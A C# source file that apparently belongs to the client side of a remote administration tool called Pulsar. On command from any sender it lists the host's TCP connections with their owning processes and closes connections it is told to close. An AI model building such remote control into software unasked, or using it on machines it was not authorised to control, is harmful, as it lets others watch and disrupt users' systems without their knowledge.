using Pulsar.Client.Utilities;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TCPConnections;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using System;
using System.Runtime.InteropServices;

namespace Pulsar.Client.Messages
{
    public class TcpConnectionsHandler : IMessageProcessor
    {
        // Local safe constants
        private const int AF_INET = 2;
        private const int TCP_TABLE_OWNER_PID_ALL = 5;

        // Local safe P/Invoke (NO uints = NO implicit conversion errors)
        [DllImport("iphlpapi.dll", SetLastError = true)]
        private static extern int GetExtendedTcpTable(
            IntPtr pTcpTable,
            ref int pdwSize,
            bool bOrder,
            int ipVersion,
            int tableClass,
            int reserved);

        public bool CanExecute(IMessage message)
        {
            return (message is GetConnections) || (message is DoCloseConnection);
        }

        public bool CanExecuteFrom(ISender sender)
        {
            return true;
        }

        public void Execute(ISender sender, IMessage message)
        {
            var msgGet = message as GetConnections;
            if (msgGet != null)
            {
                Execute(sender, msgGet);
                return;
            }

            var msgClose = message as DoCloseConnection;
            if (msgClose != null)
            {
                Execute(sender, msgClose);
                return;
            }
        }

        // =====================================================================
        //  GET CONNECTIONS
        // =====================================================================
        private void Execute(ISender client, GetConnections message)
        {
            var table = GetTable();

            if (table == null || table.Length == 0)
            {
                client.Send(new GetConnectionsResponse { Connections = new TcpConnection[0] });
                return;
            }

            var connections = new TcpConnection[table.Length];

            for (int i = 0; i < table.Length; i++)
            {
                string processName;

                try
                {
                    System.Diagnostics.Process p =
                        System.Diagnostics.Process.GetProcessById((int)table[i].owningPid);

                    processName = p.ProcessName;
                    p.Dispose();
                }
                catch
                {
                    processName = "PID: " + table[i].owningPid;
                }

                connections[i] = new TcpConnection
                {
                    ProcessName = processName,
                    LocalAddress = table[i].LocalAddress.ToString(),
                    LocalPort = (ushort)table[i].LocalPort,
                    RemoteAddress = table[i].RemoteAddress.ToString(),
                    RemotePort = (ushort)table[i].RemotePort,
                    State = (ConnectionState)table[i].state
                };
            }

            client.Send(new GetConnectionsResponse { Connections = connections });
        }

        // =====================================================================
        //  CLOSE CONNECTION
        // =====================================================================
        private void Execute(ISender client, DoCloseConnection message)
        {
            var table = GetTable();
            if (table == null)
                return;

            for (int i = 0; i < table.Length; i++)
            {
                if (message.LocalAddress == table[i].LocalAddress.ToString() &&
                    message.LocalPort == (ushort)table[i].LocalPort &&
                    message.RemoteAddress == table[i].RemoteAddress.ToString() &&
                    message.RemotePort == (ushort)table[i].RemotePort)
                {
                    table[i].state = (byte)ConnectionState.Delete_TCB;

                    IntPtr ptr = IntPtr.Zero;

                    try
                    {
                        int size = Marshal.SizeOf(typeof(NativeMethods.MibTcprowOwnerPid));
                        ptr = Marshal.AllocCoTaskMem(size);
                        Marshal.StructureToPtr(table[i], ptr, false);
                        NativeMethods.SetTcpEntry(ptr);
                    }
                    finally
                    {
                        if (ptr != IntPtr.Zero)
                            Marshal.FreeCoTaskMem(ptr);
                    }

                    Execute(client, new GetConnections());
                    return;
                }
            }
        }

        // =====================================================================
        //  GET TABLE (safe, stable, C# 7.3 compatible)
        // =====================================================================
        private NativeMethods.MibTcprowOwnerPid[] GetTable()
        {
            int buffSize = 0;

            // First call: get required buffer size
            GetExtendedTcpTable(
                IntPtr.Zero,
                ref buffSize,
                true,
                AF_INET,
                TCP_TABLE_OWNER_PID_ALL,
                0);

            if (buffSize <= 0)
                return new NativeMethods.MibTcprowOwnerPid[0];

            IntPtr buffTable = Marshal.AllocHGlobal(buffSize);

            try
            {
                // Second call: retrieve table
                int ret = GetExtendedTcpTable(
                    buffTable,
                    ref buffSize,
                    true,
                    AF_INET,
                    TCP_TABLE_OWNER_PID_ALL,
                    0);

                if (ret != 0)
                    return new NativeMethods.MibTcprowOwnerPid[0];

                // Read header
                NativeMethods.MibTcptableOwnerPid tab =
                    (NativeMethods.MibTcptableOwnerPid)Marshal.PtrToStructure(
                        buffTable, typeof(NativeMethods.MibTcptableOwnerPid));

                int count = (int)tab.dwNumEntries;
                var rows = new NativeMethods.MibTcprowOwnerPid[count];

                // Skip dwNumEntries (sizeof(uint) = 4 bytes)
                IntPtr rowPtr = new IntPtr(buffTable.ToInt64() + 4);

                int rowSize = Marshal.SizeOf(typeof(NativeMethods.MibTcprowOwnerPid));

                for (int i = 0; i < count; i++)
                {
                    rows[i] =
                        (NativeMethods.MibTcprowOwnerPid)Marshal.PtrToStructure(
                            rowPtr, typeof(NativeMethods.MibTcprowOwnerPid));

                    rowPtr = new IntPtr(rowPtr.ToInt64() + rowSize);
                }

                return rows;
            }
            finally
            {
                Marshal.FreeHGlobal(buffTable);
            }
        }
    }
}
